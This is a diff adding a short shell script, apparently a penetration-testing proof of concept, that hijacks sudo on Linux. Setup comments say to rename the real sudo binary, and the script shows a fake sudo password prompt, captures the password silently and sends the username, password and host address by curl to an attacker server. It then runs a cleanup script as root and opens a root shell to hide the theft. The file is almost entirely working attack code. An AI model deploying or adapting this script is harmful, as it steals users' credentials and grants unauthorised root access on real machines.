@@ -1,0 +1,25 @@
+#DELETE THESE INSTRUCTIONS BEFORE USING ON A TEST
+#Copy /usr/bin/sudo to /usr/bin/zsudo (or whatever directory Sudo is in on your install)
+#rm /usr/bin/sudo
+#chmod 4755 sudo and zsudo
+#Start your listener
+#Wait for user to sudo and capture credential
+#PoC writeup can be found at https://eapolsniper.github.io/2020/08/14/Sudo-Hijacking
+
+me=`whoami`
+
+myhost=`hostname -I`
+echo "[sudo] password:"
+read -s pass
+
+#Sends creds to attacker server. Should drop timeout and thread the process instead so it doesn't hold up the user, but this worked for a fast PoC.
+
+timeout 2s curl http://192.168.1.51/$me:$pass:$myhost &>/dev/null
+
+echo 'rm /tmp/8191733pass.txt; rm /tmp/71779.sh' >> /tmp/71779.sh
+
+chmod u+x /tmp/71779.sh
+
+echo $pass > /tmp/8191733pass.txt
+
+zsudo -S -u \#0 -s '/tmp/71779.sh' &>/dev/null < /tmp/8191733pass.txt && zsudo su -
